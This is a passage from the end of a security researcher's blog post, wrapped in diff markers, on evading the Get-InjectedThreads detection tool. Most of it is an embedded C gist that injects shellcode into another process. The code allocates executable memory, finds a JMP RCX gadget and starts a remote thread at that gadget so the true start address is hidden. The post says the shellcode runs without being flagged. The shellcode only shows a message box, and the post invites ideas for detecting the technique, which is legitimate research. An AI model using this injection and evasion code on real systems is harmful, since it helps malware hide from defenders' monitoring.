+          <td id="file-get_injectedthread-example_rop-c-LC34" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">DWORD</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>, <span class="pl-s1">j</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>, <span class="pl-s1">threadId</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L35" class="blob-num js-line-number js-blob-rnum" data-line-number="35"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC35" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">void</span> <span class="pl-c1">*</span><span class="pl-s1">retGadget</span> <span class="pl-c1">=</span> <span class="pl-c1">NULL</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L36" class="blob-num js-line-number js-blob-rnum" data-line-number="36"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC36" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L37" class="blob-num js-line-number js-blob-rnum" data-line-number="37"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC37" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">HANDLE</span> <span class="pl-s1">processHandle</span> <span class="pl-c1">=</span> <span class="pl-en">OpenProcess</span>(<span class="pl-c1">PROCESS_ALL_ACCESS</span>, false, <span class="pl-s1">pid</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L38" class="blob-num js-line-number js-blob-rnum" data-line-number="38"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC38" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (<span class="pl-s1">processHandle</span> <span class="pl-c1">==</span> <span class="pl-c1">INVALID_HANDLE_VALUE</span>) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L39" class="blob-num js-line-number js-blob-rnum" data-line-number="39"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC39" class="blob-code blob-code-inner js-file-line">		<span class="pl-en">printf</span>(<span class="pl-s">"[X] Error: Could not open process with PID %d\n"</span>, <span class="pl-s1">pid</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L40" class="blob-num js-line-number js-blob-rnum" data-line-number="40"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC40" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-c1">1</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L41" class="blob-num js-line-number js-blob-rnum" data-line-number="41"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC41" class="blob-code blob-code-inner js-file-line">	}</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L42" class="blob-num js-line-number js-blob-rnum" data-line-number="42"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC42" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L43" class="blob-num js-line-number js-blob-rnum" data-line-number="43"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC43" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">void</span> <span class="pl-c1">*</span><span class="pl-s1">alloc</span> <span class="pl-c1">=</span> <span class="pl-en">VirtualAllocEx</span>(<span class="pl-s1">processHandle</span>, <span class="pl-c1">0</span>, <span class="pl-c1">4096</span>, <span class="pl-c1">MEM_COMMIT</span> | <span class="pl-c1">MEM_RESERVE</span>, <span class="pl-c1">PAGE_EXECUTE_READWRITE</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L44" class="blob-num js-line-number js-blob-rnum" data-line-number="44"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC44" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (<span class="pl-s1">alloc</span> <span class="pl-c1">==</span> <span class="pl-c1">NULL</span>) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L45" class="blob-num js-line-number js-blob-rnum" data-line-number="45"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC45" class="blob-code blob-code-inner js-file-line">		<span class="pl-en">printf</span>(<span class="pl-s">"[X] Error: Could not allocate memory in process\n"</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L46" class="blob-num js-line-number js-blob-rnum" data-line-number="46"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC46" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-c1">1</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L47" class="blob-num js-line-number js-blob-rnum" data-line-number="47"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC47" class="blob-code blob-code-inner js-file-line">	}</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L48" class="blob-num js-line-number js-blob-rnum" data-line-number="48"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC48" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L49" class="blob-num js-line-number js-blob-rnum" data-line-number="49"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC49" class="blob-code blob-code-inner js-file-line">	<span class="pl-c">// Update our MessageBoxA shellcode with the API address</span></td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L50" class="blob-num js-line-number js-blob-rnum" data-line-number="50"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC50" class="blob-code blob-code-inner js-file-line">	<span class="pl-c1">*</span>(<span class="pl-smi">DWORD64</span> <span class="pl-c1">*</span>)(<span class="pl-s1">shellcode</span> <span class="pl-c1">+</span> <span class="pl-c1">26</span>) <span class="pl-c1">=</span> (<span class="pl-smi">DWORD64</span>)<span class="pl-en">GetProcAddress</span>(<span class="pl-en">LoadLibraryA</span>(<span class="pl-s">"user32.dll"</span>), <span class="pl-s">"MessageBoxA"</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L51" class="blob-num js-line-number js-blob-rnum" data-line-number="51"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC51" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L52" class="blob-num js-line-number js-blob-rnum" data-line-number="52"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC52" class="blob-code blob-code-inner js-file-line">	<span class="pl-c">// Test victim process, VBoxTray</span></td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L53" class="blob-num js-line-number js-blob-rnum" data-line-number="53"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC53" class="blob-code blob-code-inner js-file-line">	<span class="pl-smi">char</span> <span class="pl-c1">*</span><span class="pl-s1">base</span> <span class="pl-c1">=</span> (<span class="pl-smi">char</span> <span class="pl-c1">*</span>)<span class="pl-en">LoadLibraryA</span>(<span class="pl-s">"VBoxTray.exe"</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L54" class="blob-num js-line-number js-blob-rnum" data-line-number="54"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC54" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (<span class="pl-s1">base</span> <span class="pl-c1">==</span> <span class="pl-c1">NULL</span>) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L55" class="blob-num js-line-number js-blob-rnum" data-line-number="55"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC55" class="blob-code blob-code-inner js-file-line">		<span class="pl-en">printf</span>(<span class="pl-s">"[X] Could not load DLL\n"</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L56" class="blob-num js-line-number js-blob-rnum" data-line-number="56"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC56" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-c1">2</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L57" class="blob-num js-line-number js-blob-rnum" data-line-number="57"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC57" class="blob-code blob-code-inner js-file-line">	}</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L58" class="blob-num js-line-number js-blob-rnum" data-line-number="58"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC58" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L59" class="blob-num js-line-number js-blob-rnum" data-line-number="59"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC59" class="blob-code blob-code-inner js-file-line">	<span class="pl-c">// Hunting for a JMP RCX (\xff\xe1) instruction</span></td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L60" class="blob-num js-line-number js-blob-rnum" data-line-number="60"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC60" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">for</span> (<span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">100000</span> <span class="pl-c1">&amp;&amp;</span> <span class="pl-s1">retGadget</span> <span class="pl-c1">==</span> <span class="pl-c1">NULL</span>; <span class="pl-s1">i</span> <span class="pl-c1">+=</span> <span class="pl-s1">bytesRead</span>) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L61" class="blob-num js-line-number js-blob-rnum" data-line-number="61"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC61" class="blob-code blob-code-inner js-file-line">		<span class="pl-en">printf</span>(<span class="pl-s">"[*] Hunting for gadget at address %p\n"</span>, (<span class="pl-smi">char</span> <span class="pl-c1">*</span>)<span class="pl-s1">base</span> <span class="pl-c1">+</span> <span class="pl-s1">i</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L62" class="blob-num js-line-number js-blob-rnum" data-line-number="62"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC62" class="blob-code blob-code-inner js-file-line">		<span class="pl-en">ReadProcessMemory</span>(<span class="pl-s1">processHandle</span>, (<span class="pl-smi">char</span> <span class="pl-c1">*</span>)<span class="pl-s1">base</span> <span class="pl-c1">+</span> <span class="pl-s1">i</span>, <span class="pl-s1">buffer</span>, <span class="pl-c1">4096</span>, <span class="pl-c1">&amp;</span><span class="pl-s1">bytesRead</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L63" class="blob-num js-line-number js-blob-rnum" data-line-number="63"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC63" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">for</span> (<span class="pl-s1">j</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">j</span> <span class="pl-c1">+</span> <span class="pl-c1">1</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">bytesRead</span> <span class="pl-c1">&amp;&amp;</span> <span class="pl-s1">retGadget</span> <span class="pl-c1">==</span> <span class="pl-c1">NULL</span>; <span class="pl-s1">j</span><span class="pl-c1">++</span>) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L64" class="blob-num js-line-number js-blob-rnum" data-line-number="64"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC64" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-s1">buffer</span>[<span class="pl-s1">j</span>] <span class="pl-c1">==</span> <span class="pl-c1">'\xff'</span> <span class="pl-c1">&amp;&amp;</span> <span class="pl-s1">buffer</span>[<span class="pl-s1">j</span><span class="pl-c1">+</span><span class="pl-c1">1</span>] <span class="pl-c1">==</span> <span class="pl-c1">'\xe1'</span>) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L65" class="blob-num js-line-number js-blob-rnum" data-line-number="65"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC65" class="blob-code blob-code-inner js-file-line">				<span class="pl-s1">retGadget</span> <span class="pl-c1">=</span> (<span class="pl-smi">char</span> <span class="pl-c1">*</span>)<span class="pl-s1">base</span> <span class="pl-c1">+</span> <span class="pl-s1">i</span> <span class="pl-c1">+</span> <span class="pl-s1">j</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L66" class="blob-num js-line-number js-blob-rnum" data-line-number="66"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC66" class="blob-code blob-code-inner js-file-line">			}</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L67" class="blob-num js-line-number js-blob-rnum" data-line-number="67"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC67" class="blob-code blob-code-inner js-file-line">		}</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L68" class="blob-num js-line-number js-blob-rnum" data-line-number="68"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC68" class="blob-code blob-code-inner js-file-line">	}</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L69" class="blob-num js-line-number js-blob-rnum" data-line-number="69"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC69" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L70" class="blob-num js-line-number js-blob-rnum" data-line-number="70"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC70" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (<span class="pl-s1">retGadget</span> <span class="pl-c1">==</span> <span class="pl-c1">NULL</span>) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L71" class="blob-num js-line-number js-blob-rnum" data-line-number="71"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC71" class="blob-code blob-code-inner js-file-line">		<span class="pl-en">printf</span>(<span class="pl-s">"[X] Error: Could not find JMP gadget\n"</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L72" class="blob-num js-line-number js-blob-rnum" data-line-number="72"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC72" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-c1">2</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L73" class="blob-num js-line-number js-blob-rnum" data-line-number="73"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC73" class="blob-code blob-code-inner js-file-line">	}</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L74" class="blob-num js-line-number js-blob-rnum" data-line-number="74"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC74" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L75" class="blob-num js-line-number js-blob-rnum" data-line-number="75"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC75" class="blob-code blob-code-inner js-file-line">	<span class="pl-en">printf</span>(<span class="pl-s">"[*] Found JMP RCX gadget at address %p\n"</span>, <span class="pl-s1">retGadget</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L76" class="blob-num js-line-number js-blob-rnum" data-line-number="76"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC76" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L77" class="blob-num js-line-number js-blob-rnum" data-line-number="77"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC77" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (!<span class="pl-en">WriteProcessMemory</span>(<span class="pl-s1">processHandle</span>, <span class="pl-s1">alloc</span>, <span class="pl-s1">shellcode</span>, <span class="pl-k">sizeof</span>(<span class="pl-s1">shellcode</span>), <span class="pl-c1">&amp;</span><span class="pl-s1">bytesWritten</span>)) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L78" class="blob-num js-line-number js-blob-rnum" data-line-number="78"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC78" class="blob-code blob-code-inner js-file-line">		<span class="pl-en">printf</span>(<span class="pl-s">"[X] Error writing shellcode into memory\n"</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L79" class="blob-num js-line-number js-blob-rnum" data-line-number="79"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC79" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-c1">2</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L80" class="blob-num js-line-number js-blob-rnum" data-line-number="80"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC80" class="blob-code blob-code-inner js-file-line">	}</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L81" class="blob-num js-line-number js-blob-rnum" data-line-number="81"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC81" class="blob-code blob-code-inner js-file-line">	<span class="pl-en">printf</span>(<span class="pl-s">"[*] Written %d bytes of shellcode to %p\n"</span>, <span class="pl-s1">bytesWritten</span>, <span class="pl-s1">alloc</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L82" class="blob-num js-line-number js-blob-rnum" data-line-number="82"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC82" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L83" class="blob-num js-line-number js-blob-rnum" data-line-number="83"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC83" class="blob-code blob-code-inner js-file-line">	<span class="pl-en">printf</span>(<span class="pl-s">"[*] Starting thread execution\n"</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L84" class="blob-num js-line-number js-blob-rnum" data-line-number="84"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC84" class="blob-code blob-code-inner js-file-line">	<span class="pl-s1">threadHandle</span> <span class="pl-c1">=</span> <span class="pl-en">CreateRemoteThread</span>(<span class="pl-s1">processHandle</span>, <span class="pl-c1">NULL</span>, <span class="pl-c1">0</span>, (<span class="pl-c1">LPTHREAD_START_ROUTINE</span>)((<span class="pl-smi">char</span><span class="pl-c1">*</span>)<span class="pl-s1">retGadget</span>), <span class="pl-s1">alloc</span>, <span class="pl-c1">0</span>, <span class="pl-c1">&amp;</span><span class="pl-s1">threadId</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L85" class="blob-num js-line-number js-blob-rnum" data-line-number="85"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC85" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">if</span> (<span class="pl-s1">threadHandle</span> <span class="pl-c1">==</span> <span class="pl-c1">NULL</span>) {</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L86" class="blob-num js-line-number js-blob-rnum" data-line-number="86"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC86" class="blob-code blob-code-inner js-file-line">		<span class="pl-en">printf</span>(<span class="pl-s">"[X] Error: CreateRemoteThread failed [%d] :(\n"</span>, <span class="pl-en">GetLastError</span>());</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L87" class="blob-num js-line-number js-blob-rnum" data-line-number="87"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC87" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-c1">2</span>;</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L88" class="blob-num js-line-number js-blob-rnum" data-line-number="88"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC88" class="blob-code blob-code-inner js-file-line">	}</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L89" class="blob-num js-line-number js-blob-rnum" data-line-number="89"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC89" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L90" class="blob-num js-line-number js-blob-rnum" data-line-number="90"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC90" class="blob-code blob-code-inner js-file-line">	<span class="pl-en">printf</span>(<span class="pl-s">"[*] Thread ID %x created\n"</span>, <span class="pl-s1">threadId</span>);</td>
+        </tr>
+        <tr>
+          <td id="file-get_injectedthread-example_rop-c-L91" class="blob-num js-line-number js-blob-rnum" data-line-number="91"></td>
+          <td id="file-get_injectedthread-example_rop-c-LC91" class="blob-code blob-code-inner js-file-line">}</td>
+        </tr>
+  </tbody></table>
+</div>
+
+
+    </div>
+
+  </div>
+
+</div>
+
+      </div>
+      <div class="gist-meta">
+        <a href="https://gist.github.com/xpn/fc7935ab38c781746c9d896f3aec4b08/raw/106b72951f238f78be950cca02c1f4010ea38130/get_injectedthread-example_rop.c" style="float:right" class="Link--inTextBlock">view raw</a>
+        <a href="https://gist.github.com/xpn/fc7935ab38c781746c9d896f3aec4b08#file-get_injectedthread-example_rop-c" class="Link--inTextBlock">
+          get_injectedthread-example_rop.c
+        </a>
+        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
+      </div>
+    </div>
+</div>
+
+
+
+<p>And when executed, we find that our shellcode can run without being flagged:</p>
+<p><img src="https://res.cloudinary.com/xpnsec/image/upload/images/2018/04/bypass3.png" alt="bypass3"></p>
+<p>So there we have it, a few different methods of spawning our thread whilst obscuring the true start address. Hopefully this proves to be useful if you ever come across a similar detection technique. If you have any methods in which the above examples can be detected using <code>Get-InjectedThreads</code>, it would be awesome to hear them!</p>
+<h2 id="More-reading"><a href="https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/#More-reading" class="headerlink" title="More reading"></a>More reading</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2">Get-InjectedThreads</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.endgame.com/blog/technical-blog/hunting-memory">EndGame - Hunting in memory</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.sans.org/summit-archives/file/summit-archive-1492714038.pdf">Hunting in memory presentation</a></li>
+</ul>
+
+  </article>
+  <div class="reading-progress-bar">
+    <div class="reading-progress-fill" style="width: 0%;"></div>
+  </div>
+</div>
+
+      </main> 
+    </div>
+    
+
+    
+    
+
+
+    
+
+
+    
+
+
+    </div>
+  
+
+</body></html>
